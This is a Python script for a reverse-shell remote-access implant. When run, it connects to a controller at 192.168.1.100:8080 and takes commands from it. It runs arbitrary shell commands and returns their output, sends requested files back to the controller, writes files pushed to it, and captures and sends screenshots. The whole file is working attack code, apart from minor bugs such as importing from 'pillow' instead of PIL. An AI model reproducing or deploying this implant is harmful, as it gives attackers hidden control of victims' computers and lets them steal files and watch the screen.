import socket
import subprocess
import os
import time
import tempfile
import shutil
from pillow import ImageGrab


def transfer(s, path):
    if os.path.exists(path):
        print('transfer')
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())


def download(conn, command):
    print("downloading...")
    f = open('./' + command, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            print('DONE')
            f.write(bits[:-4])
            f.close()
            break
        f.write(bits)


def connecting():
    print("connected...")
    s = socket.socket()
    s.connect(("192.168.1.100", 8080))

    while True:
        command = s.recv(1024).decode()
        print(command)
        if 'exit' in command:
            s.close()
            break

        elif 'cd' in command:
            cd, path = command.split()
            print("cd fun")
            try:
                os.chdir(path)
                s.send(('[+] CWD is' + os.getcwd()).encode())
            except Exception as e:
                s.send(('[-]' + str(e)).encode())

        elif 'copy' in command:
            grab, path = command.split()
            print("copy fun")
            try:
                transfer(s, path)
            except:
                pass

        elif 'send' in command:
            send, path = command.split()
            print("send fun + path = {}".format(path))
            try:
                download(s, path)
            except:
                s.send("something went wrong".encode())
                pass
        elif command == 'sreenshot':
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
            path = dirpath + "\img.jpg"
            file = open(path, 'rb')
            packet = file.read(1024)
            while len(packet) > 0:
                s.send(packet)
                packet = file.read(1024)
            s.send('DONE'.encode())
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
            s.send("DONE".encode())


def main():
    connecting()


main()
